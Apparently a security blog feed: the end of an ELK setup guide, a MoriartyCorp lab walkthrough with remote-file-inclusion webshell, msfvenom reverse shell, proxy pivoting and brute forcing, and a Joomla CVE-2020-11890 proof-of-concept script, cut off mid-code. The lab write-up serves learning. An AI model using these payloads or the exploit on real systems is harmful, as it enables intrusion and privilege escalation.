https://artifacts.elastic.co/downloads/elasticsearch/elasticsearch-7.6.2-x86_64.rpm</span><br></pre></td></tr></table></figure><blockquote><p>下载较慢的话建议科学下载</p></blockquote><ol start="3"><li>安装</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -ivh elasticsearch-7.6.2-x86_64.rpm </span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200504174503913.png" alt="image-20200504174503913"></p><ol start="4"><li>配置</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/elasticsearch/elasticsearch.yml</span><br></pre></td></tr></table></figure><p>取消以下两行的注释</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200504174906489.png" alt="image-20200504174906489"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200504175014902.png" alt="image-20200504175014902"></p><ol start="5"><li>启动</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# systemctl daemon-reload</span><br><span class="line">[root@localhost ~]# systemctl enable elasticsearch</span><br><span class="line">[root@localhost ~]# systemctl start elasticsearch</span><br><span class="line">[root@localhost ~]# netstat -plntu</span><br></pre></td></tr></table></figure><p>观察到9200端口，证明启动成功</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200504175254546.png" alt="image-20200504175254546"></p><h3 id="安装Nginx"><a href="#安装Nginx" class="headerlink" title="安装Nginx"></a>安装Nginx</h3><ol><li>安装</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[root@localhost ~]# yum install epel-release -y[root@localhost ~]# yum install nginx httpd-tools -y</span><br></pre></td></tr></table></figure><p>安装Nginx之前要先安装epel源</p><ol start="2"><li>配置</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/nginx.conf</span><br></pre></td></tr></table></figure><p>这里把位于36、59行之间的Server块删掉，更多的配置项在 /etc/nginx/conf.d/*.conf中</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">36 include /etc/nginx/conf.d/*.conf;Server &#123; &#125;59# Settings for a TLS enabled server.</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200504180031958.png" alt="image-20200504180031958"></p><h3 id="Kibanna添加代理"><a href="#Kibanna添加代理" class="headerlink" title="Kibanna添加代理"></a>Kibanna添加代理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/conf.d/kibana.conf</span><br></pre></td></tr></table></figure><blockquote><p>这里域名为 elk-stack.co，然后使用http协议的basic认证，密码稍后添加，然后看location块，当Nginx监听到域名为elk-stack.co，端口为80的请求时，就会转发给本地监听端口5601的进程，这个进程就是kibana，下一步安装它，内容如下：</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;listen 80;server_name elk-stack.co;auth_basic &quot;Restricted Access&quot;;auth_basic_user_file /etc/nginx/.kibana-user;location / &#123;    proxy_pass http://localhost:5601;    proxy_http_version 1.1;    proxy_set_header Upgrade $http_upgrade;    proxy_set_header Connection &#x27;upgrade&#x27;;    proxy_set_header Host $host;    proxy_cache_bypass $http_upgrade;&#125; &#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200507221717828.png" alt="image-20200507221717828"></p><h3 id="Elasticsearch添加代理"><a href="#Elasticsearch添加代理" class="headerlink" title="Elasticsearch添加代理"></a>Elasticsearch添加代理</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/nginx/conf.d/elasticsearch.conf</span><br></pre></td></tr></table></figure><blockquote><p>当Nginx监听到域名为elk-stack.co，端口为81的请求时，就会转发给本地监听端口9200的进程，这个进程就是Elasticsearch</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server &#123;listen 81;server_name elk-stack.co;location / &#123;    proxy_pass http://localhost:9200;    proxy_http_version 1.1;    proxy_set_header Upgrade $http_upgrade;    proxy_set_header Connection &#x27;upgrade&#x27;;    proxy_set_header Host $host;    proxy_cache_bypass $http_upgrade;&#125; &#125;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200507222435945.png" alt="image-20200507222435945"></p><h3 id="添加basic认证"><a href="#添加basic认证" class="headerlink" title="添加basic认证"></a>添加basic认证</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">htpasswd -c /etc/nginx/.kibana-user admin</span><br></pre></td></tr></table></figure><blockquote><p>然后输入你的密码，记住最后要通过这个来登录kibana的</p></blockquote><h3 id="测试Nginx配置"><a href="#测试Nginx配置" class="headerlink" title="测试Nginx配置"></a>测试Nginx配置</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nginx -t</span><br></pre></td></tr></table></figure><p>出现如下证明Nginx成功</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200507223447583.png" alt="image-20200507223447583"></p><blockquote><p>如果出现 test failed，就回过头检查/etc/nginx/conf.d/kibana.conf和/etc/nginx/nginx.conf这两个文件，肯定是不小心弄错了。<br>如果输出 test is successful，那么就可以启动 nginx 了</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl enable nginxsystemctl start nginx</span><br></pre></td></tr></table></figure><h3 id="安装Kibana"><a href="#安装Kibana" class="headerlink" title="安装Kibana"></a>安装Kibana</h3><ol><li>下载好对应的rpm包</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -ivh kibana-7.6.2-x86_64.rpm </span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200507225326794.png" alt="image-20200507225326794"></p><ol start="2"><li>修改Kibana配置</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/kibana/kibana.yml</span><br></pre></td></tr></table></figure><ol start="3"><li>取消2、7、28行的注释，行号不一定准确，但一定是下面这几项（各个版本行号可能有出入）</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">server.port: 5601server.host: &quot;localhost&quot;elasticsearch.url: &quot;http://localhost:9200&quot;</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200507231907245.png" alt="image-20200507231907245"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200507232332287.png" alt="image-20200507232332287"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200507232609205.png" alt="image-20200507232609205"></p><ol start="4"><li>启动Kibana</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl enable kibanasystemctl start kibananetstat -plntu</span><br></pre></td></tr></table></figure><p>出现5601端口代表Kibana启动成功</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200507233100421.png" alt="image-20200507233100421"></p><h3 id="安装Logstash"><a href="#安装Logstash" class="headerlink" title="安装Logstash"></a>安装Logstash</h3><ol><li><p>下载对应的rpm包</p></li><li><p>安装</p></li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">rpm -ivh logstash-7.6.2.rpm</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200507233242902.png" alt="image-20200507233242902"></p><ol start="3"><li>启动</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">systemctl enable logstashsystemctl start logstash</span><br></pre></td></tr></table></figure><h2 id="安装成功"><a href="#安装成功" class="headerlink" title="安装成功"></a>安装成功</h2><p>访问对应ip的80端口</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200507233840411.png" alt="image-20200507233840411"></p><p>如需用上面的域名访问，添加一条hosts就行</p><blockquote><p>后面ELK优化敬请期待下一篇文章~</p></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;基于Centos快速搭建ELK&quot;&gt;&lt;a href=&quot;#基于Centos快速搭建ELK&quot; class=&quot;headerlink&quot; title=&quot;基于Centos快速搭建ELK&quot;&gt;&lt;/a&gt;基于Centos快速搭建ELK&lt;/h1&gt;&lt;p&gt;[TOC]&lt;/p&gt;
&lt;blockqu</summary>
      
    
    
    
    <category term="安全运营" scheme="http://example.com/categories/%E5%AE%89%E5%85%A8%E8%BF%90%E8%90%A5/"/>
    
    
    <category term="ELK" scheme="http://example.com/tags/ELK/"/>
    
  </entry>
  
  <entry>
    <title>MoriartyCorp靶场一日游</title>
    <link href="http://example.com/2020/05/03/MoriartyCorp%E9%9D%B6%E5%9C%BA%E4%B8%80%E6%97%A5%E6%B8%B8/"/>
    <id>http://example.com/2020/05/03/MoriartyCorp%E9%9D%B6%E5%9C%BA%E4%B8%80%E6%97%A5%E6%B8%B8/</id>
    <published>2020-05-03T06:35:02.000Z</published>
    <updated>2021-09-28T09:24:21.141Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Moriarty-Corp靶场一日游"><a href="#Moriarty-Corp靶场一日游" class="headerlink" title="Moriarty Corp靶场一日游"></a>Moriarty Corp靶场一日游</h1><h2 id="靶场简介"><a href="#靶场简介" class="headerlink" title="靶场简介"></a>靶场简介</h2><blockquote><p>Moriarty Corp靶场环境包含一台外网服务器和三台内网主机，攻击者需先对外网服务器进行web攻击，依据提交flag后的提示信息，逐步获取内网主机权限。本次靶场环境包含以下10个关键部分：</p></blockquote><h2 id="靶场攻略"><a href="#靶场攻略" class="headerlink" title="靶场攻略"></a>靶场攻略</h2><blockquote><p>推荐靶机使用Virtualbox搭建（我是不会告诉你们我VMware翻车了）</p></blockquote><h3 id="信息搜集"><a href="#信息搜集" class="headerlink" title="信息搜集"></a>信息搜集</h3><blockquote><p>利用Nmap进行简单的端口探测</p></blockquote><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">nmap -sn -PR -T 4 192.168.1.0/24</span><br></pre></td></tr></table></figure><ul><li><p>-sn：只进行主机发现，不进行端口扫描。</p></li><li><p>-PR：ARP Ping。</p></li><li><p>-T：指定扫描过程使用的时序，总有6个级别（0-5），级别越高，扫描速度越快，在网络通讯状况较好的情况下推荐使用T4。</p></li></ul><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200501110334057.png" alt="image-20200501110334057"></p><p>这里也可以直接使用<code>arp -a</code></p><blockquote><p>根据靶机说明，开启靶机需要先在靶机8000端口上提交<code>flag&#123;start&#125;</code>开启靶场环境</p></blockquote><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502104553594.png" alt="image-20200502104553594"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502110046688.png" alt="image-20200502110046688"></p><hr><h3 id="初步探测"><a href="#初步探测" class="headerlink" title="初步探测"></a>初步探测</h3><p>访问靶机80端口，呈现以下页面</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502111050267.png" alt="image-20200502111050267"></p><p>访问其中两个博客链接，观察url可发现形式为file=xxx,猜测可能存在路径遍历或者文件包含漏洞</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502111414684.png" alt="image-20200502111414684"></p><p>fuzz中……..</p><p>还fuzz个屁</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502113035237.png" alt="image-20200502113035237"></p><p>尝试文件包含</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502115323304.png" alt="image-20200502115323304"></p><p>包含webshell，通过蚁剑连接，连接地址如下</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">http://192.168.3.53/?file=http://xx.xx.xx.xx/1.txt</span><br></pre></td></tr></table></figure><p>通过翻垃圾找到第一个flag</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502115720085.png" alt="image-20200502115720085"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502115737818.png" alt="image-20200502115737818"></p><p>提交flag至8000端口</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502115831491.png" alt="image-20200502115831491"></p><p>看到提示目标存在内网信息，内网ip段范围在172.17.0.3-254</p><hr><h3 id="内网打点"><a href="#内网打点" class="headerlink" title="内网打点"></a>内网打点</h3><p>思路： 先利用msf反弹一个会话，建立一个内网通道再进行下一步的信息搜集</p><ol><li>利用msfvenom生成elf进行反弹shell</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=IP LPORT=PORT -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure><ol start="2"><li>将生成的elf文件上传至目标机器，给与执行权限执行</li></ol><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chmod 777 shell</span><br><span class="line">.elf ./shell.elf</span><br></pre></td></tr></table></figure><ol start="3"><li>msf开启监听反弹Meterpreter会话</li></ol><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502173732550.png" alt="image-20200502173732550"></p><p>根据之前提示，查看当前网段</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502173806292.png" alt="image-20200502173806292"></p><p>利用msf建立路由</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">run autoroute -s 172.17.0.0/24 25</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503091444686.png" alt="image-20200503091444686"></p><p>利用Proxychains工具配置socks5代理</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502174330769.png" alt="image-20200502174330769"></p><p>编辑配置文件，添加socks5代理</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">vim /etc/proxychains.conf</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200502174521893.png" alt="image-20200502174521893"></p><hr><h3 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h3><p>利用上面建立的代理通道配合nmap进行172网段的简单信息搜集</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap 172.17.0.0/24 -sV -sT -Pn -T4 -p 80,8080,8000,443</span><br></pre></td></tr></table></figure><p>根据探测结果，发现172.17.0.4存在一个web服务</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503101038756.png" alt="image-20200503101038756"></p><p>观察页面似乎是个上传点，但好像需要输入相关密码，猜测可能思路是通过爆破获取密码再上传webshell</p><p>burp开搞</p><p>burp先配置msf生成的socks代理</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503101405961.png" alt="image-20200503101405961"></p><p>简单爆破得到密码是<code>password</code>PS:还好靶机的密码不是太复杂</p><p>直接上传webshell</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503103447619.png" alt="image-20200503103447619"></p><p>配置蚁剑代理</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503103548809.png" alt="image-20200503103548809"></p><p>翻垃圾，找到第二个flag</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503104345560.png" alt="image-20200503104345560"></p><p>提交第二个flag获取进一步提示</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503113841670.png" alt="image-20200503113841670"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503113723408.png" alt="image-20200503113723408"></p><p>根据提示给出了一部分hash，似乎是让我们破解</p><p>hash 丢到cmd5，查出结果</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503113920835.png" alt="image-20200503113920835"></p><p>回到刚开始，利用nmap进行22端口扫描</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap -sV -sT  -Pn -p22 172.17.0.0/24</span><br></pre></td></tr></table></figure><p>根据结果得到<code>172.17.0.1</code>和<code>172.17.0.12</code>开放了ssh端口</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503131849066.png" alt="image-20200503131849066"></p><p>利用之前得到的信息，构建字典，结合<code>proxychains</code>和<code>hydra</code>进行ssh弱口令爆破</p><p>爆破得到弱口令：用户名：root，密码：weapons</p><p>利用第三方ssh工具MobaXterm配置代理进行连接</p><p>MobaXterm下载地址：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://mobaxterm.mobatek.net/</span><br></pre></td></tr></table></figure><p>成功连接目标机器</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503132257957.png" alt="image-20200503132257957"></p><p>查看flag</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503133018026.png" alt="image-20200503133018026"></p><p>提交flag至主目录得到下一步提示</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503133118875.png" alt="image-20200503133118875"></p><p>提示我们目标网段存在一个聊天服务器，并给出用户名密码buyer13/arms13，猜测可能是登录聊天服务器</p><p>继续用kali探测端口</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap 172.17.0.0/24 -sV  -sT  -Pn  -T4 -p443,8000,8080,8888</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503133642932.png" alt="image-20200503133642932"></p><p>发现<code>172.17.0.13</code>开放目标端口，输入密码</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503134949879.png" alt="image-20200503134949879"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503135059609.png" alt="image-20200503135059609"></p><p>观察得知存在修改密码功能，猜测可能存在任意用户密码重置</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503140444139.png" alt="image-20200503140444139"></p><p>修改admin密码并成功登录查看消息</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503140527481.png" alt="image-20200503140527481"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503140513666.png" alt="image-20200503140513666"></p><p>提交第四个flag至主面板</p><p>flag{on_the_move}</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503140650555.png" alt="image-20200503140650555"></p><p>根据提示的信息，有个Elasticsearch</p><p>Elasticsearch服务通常是运行在9200端口上</p><p>继续kali探测服务</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">proxychains nmap 172.17.0.0/24 -sV  -sT  -Pn  -T4 -p9200</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503140839525.png" alt="image-20200503140839525"></p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503140926601.png" alt="image-20200503140926601"></p><p>得知版本为4.10.2</p><p>利用kali自带的漏洞搜寻功能</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503141154254.png" alt="image-20200503141154254"></p><p>发现存在远程代码执行漏洞</p><p>攻击成功</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503141401840.png" alt="image-20200503141401840"></p><p>获取最后一个flag</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503141434877.png" alt="image-20200503141434877"></p><p>提交</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503141504208.png" alt="image-20200503141504208"></p><p>如上所述，ip已被拉黑</p><h2 id="个人总结"><a href="#个人总结" class="headerlink" title="个人总结"></a>个人总结</h2><p>根据之前的信息大概获取到目标的拓扑图</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200503142949188.png" alt="image-20200503142949188"></p><p>遇到的坑：</p><ul><li>burp不支持socks4代理，kali建立隧道时注意，可以采用reg等其他代理脚本建立隧道</li></ul><h2 id="资源总结"><a href="#资源总结" class="headerlink" title="资源总结"></a>资源总结</h2><blockquote><ul><li><p>靶场下载地址：</p><p>Download (Mirror):</p><p><a href="https://download.vulnhub.com/boredhackerblog/MoriartyCorp.ova">https://download.vulnhub.com/boredhackerblog/MoriartyCorp.ova</a></p><p>Download (Torrent):</p><p> <a href="https://download.vulnhub.com/boredhackerblog/MoriartyCorp.ova.torrent">https://download.vulnhub.com/boredhackerblog/MoriartyCorp.ova.torrent</a></p></li></ul></blockquote><blockquote><ul><li><p>靶场说明参考：</p><p><a href="https://www.vulnhub.com/entry/boredhackerblog-moriarty-corp,456/">https://www.vulnhub.com/entry/boredhackerblog-moriarty-corp,456/</a></p></li></ul></blockquote>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Moriarty-Corp靶场一日游&quot;&gt;&lt;a href=&quot;#Moriarty-Corp靶场一日游&quot; class=&quot;headerlink&quot; title=&quot;Moriarty Corp靶场一日游&quot;&gt;&lt;/a&gt;Moriarty Corp靶场一日游&lt;/h1&gt;&lt;h2 id=&quot;靶</summary>
      
    
    
    
    <category term="靶机复现" scheme="http://example.com/categories/%E9%9D%B6%E6%9C%BA%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="OSCP" scheme="http://example.com/tags/OSCP/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2020-11890漏洞复现</title>
    <link href="http://example.com/2020/04/27/CVE-2020-11890%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    <id>http://example.com/2020/04/27/CVE-2020-11890%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/</id>
    <published>2020-04-27T15:18:20.000Z</published>
    <updated>2021-09-28T09:49:05.035Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2020-11890漏洞复现"><a href="#CVE-2020-11890漏洞复现" class="headerlink" title="CVE-2020-11890漏洞复现"></a>CVE-2020-11890漏洞复现</h1><h3 id="漏洞简介"><a href="#漏洞简介" class="headerlink" title="漏洞简介"></a>漏洞简介</h3><blockquote><p>Joomla!是美国Open Source Matters团队的一套使用PHP和MySQL开发的开源、跨平台的内容管理系统(CMS)。 Joomla! 2.5.0版本至3.9.16版本中存在访问控制错误漏洞，该漏洞源于不正确的输入验证。攻击者可利用该漏洞绕过ACL保护</p></blockquote><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>环境：docker</p><p>利用docker拉取镜像</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker pull hoangkien1020/joomla:3.9.16</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200427230457619.png" alt="image-20200427230457619"></p><p>启动docker漏洞环境</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker run -d --rm -it -p 8080:80 hoangkien1020/joomla:3.9.16</span><br></pre></td></tr></table></figure><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200427230613515.png" alt="image-20200427230613515"></p><p>打开本地8080端口</p><p><img src="https://blog-1255850204.cos.ap-guangzhou.myqcloud.com/uPic/image-20200427230742635.png" alt="image-20200427230742635"></p><p>观察到以上页面证明漏洞环境运行成功</p><p>该漏洞环境相关参数如下：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">### MySQL: root: root (can access via IP:8080/phpmyadmin)</span><br><span class="line"></span><br><span class="line">### superadmin:1234 (Super Users)</span><br><span class="line"></span><br><span class="line">### admin:1234 (Administrator)</span><br><span class="line"></span><br><span class="line">### hacker:1234 (Manager) </span><br></pre></td></tr></table></figure><p>POC如下：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">extract_token</span>(<span class="params">resp</span>):</span></span><br><span class="line">    match = re.search(<span class="string">r&#x27;name=&quot;([a-f0-9]&#123;32&#125;)&quot; value=&quot;1&quot;&#x27;</span>, resp.text, re.S)</span><br><span class="line">    <span class="keyword">if</span> match <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;[-] Cannot find CSRF token!\n&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="keyword">return</span> match.group(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">try_admin_login</span>(<span class="params">sess, url, uname, upass</span>):</span></span><br><span class="line">    admin_url = url + <span class="string">&#x27;/administrator/index.php&#x27;</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Getting token for admin login&#x27;</span>)</span><br><span class="line">    resp = sess.get(admin_url, verify=<span class="literal">True</span>)</span><br><span class="line">    token = extract_token(resp)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Logging in to admin&#x27;</span>)</span><br><span class="line">    data = &#123;</span><br><span class="line">        <span class="string">&#x27;username&#x27;</span>: uname,</span><br><span class="line">        <span class="string">&#x27;passwd&#x27;</span>: upass,</span><br><span class="line">        <span class="string">&#x27;task&#x27;</span>: <span class="string">&#x27;login&#x27;</span>,</span><br><span class="line">        token: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    &#125;</span><br><span class="line">    resp = sess.post(admin_url, data=data, verify=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;task=profile.edit&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> resp.text:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[!] Admin Login Failure!&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">None</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;[+] Admin Login Successfully!&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkAdmin</span>(<span class="params">url, sess</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Checking admin&quot;</span>)</span><br><span class="line">    url_check = url + <span class="string">&#x27;/administrator/index.php?option=com_users&amp;view=users&#x27;</span></span><br><span class="line">    resp = sess.get(url_check, verify=<span class="literal">True</span>)</span><br><span class="line">    token = extract_token(resp)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[-] You are not administrator!&quot;</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">checkSuperAdmin</span>(<span class="params">url, sess</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Checking Superadmin&quot;</span>)</span><br><span class="line">    url_check = url + <span class="string">&#x27;/administrator/index.php?option=com_config&#x27;</span></span><br><span class="line">    resp = sess.get(url_check, verify=<span class="literal">True</span>)</span><br><span class="line">    token = extract_token(resp)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> token:</span><br><span class="line">        <span class="built_in">print</span> <span class="string">&quot;[-] You are not Super-Users!&quot;</span></span><br><span class="line">        sys.exit()</span><br><span class="line">    <span class="keyword">return</span> token</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">changeGroup</span>(<span class="params">url, sess, token</span>):</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;[+] Changing group&quot;</span>)</span><br><span class="line">    newdata = &#123;</span><br><span class="line">        <span class="string">&#x27;jform[title]&#x27;</span>: <span class="string">&#x27;Public&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;jform[parent_id]&#x27;</span>: <span class="number">100</span>,</span><br><span class="line">        <span class="string">&#x27;task&#x27;</span>: <span class="string">&#x27;group.apply&#x27;</span>,</span><br><span class="line">        token: <span class="number">1</span></span><br><span class="line">    &#125;</span><br><span class="line">    newdata[<span class="string">&#x27;task&#x27;</span>] = <span class="string">&#x27;group.apply&#x27;</span></span><br><span class="line">    resp = sess.post(url + <span class="string">&quot;/administrator/index.php?option=com_users&amp;layout=edit&amp;id=1&quot;</span>, data=newdata,</span><br><span class="line">                     verify=<span class="literal">True</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;jform[parent_id]&#x27;</span> <span class="keyword">not</span> <span 